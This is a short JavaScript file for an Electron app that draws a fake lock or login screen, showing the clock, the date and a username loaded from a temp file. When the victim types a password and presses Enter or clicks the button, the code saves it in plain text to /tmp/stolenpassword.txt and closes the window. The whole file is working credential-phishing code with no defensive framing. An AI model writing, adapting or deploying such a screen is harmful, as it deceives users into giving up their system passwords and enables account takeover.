const fs = require("fs");
const { app, BrowserWindow } = require('electron');

function get_time() {

    let time = new Date;

    let hours = time.getHours().toString()
    if (hours.length == 1) {
        hours = "0" + hours
    }

    let minutes = time.getMinutes().toString()
    if (minutes.length == 1) {
        minutes = "0" + minutes
    }
    return hours + ":" + minutes;

}

function get_week_day() {

    let time = new Date;

    return time.toUTCString().split(" ").slice(0, 4).join(" ")

}

function write(e) {

    let password = document.getElementsByClassName("password-input")[0].value

    fs.writeFileSync("/tmp/stolenpassword.txt", password, "utf-8");

    window.close()

}


function pressed(e) {

    if (e.key == "Enter") {
        write()
    }

}

document.getElementsByTagName("body")[0].addEventListener("keydown", pressed);
document.getElementsByClassName("password-button")[0].addEventListener(
    "click", write
);

var time = document.getElementsByClassName("head-time")[0]
time.textContent = get_time()

var date = document.getElementsByClassName("head-date")[0]
date.textContent = get_week_day()

var user = document.getElementsByClassName("main-user")[0]
try {
    let data = fs.readFileSync('/tmp/stealinguser.txt', 'utf-8');
    user.textContent = data;
} catch(err) {
    window.close()
}
